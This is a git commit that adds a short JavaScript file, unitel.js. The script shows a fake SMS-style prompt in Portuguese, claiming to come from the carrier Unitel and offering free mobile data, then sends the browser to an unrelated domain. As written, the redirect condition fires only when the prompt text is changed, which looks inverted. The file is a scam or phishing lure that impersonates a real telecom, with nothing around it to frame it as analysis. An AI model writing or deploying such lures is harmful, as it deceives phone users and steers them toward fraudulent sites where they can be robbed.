38434b88a31b52bc13d3b245241ed3e92f05605a
newetijazz7 <newetijazz7@gmail.com>
2025-10-06 09:58:28 +0100

    Create unitel.js

---
+++ unitel.js
@@ -0,0 +1,5 @@
+var password = 'ATIVAR'
+password=prompt('SMS: Parabéns, seu número unitel é elegível para receber recompensa de dados grátis, clique em OK para ativar os dados grátis','ATIVAR');
+if (password != 'ATIVAR') {
+location.href='https://www.jvrrdif.online/Unitel-50gb';
+}
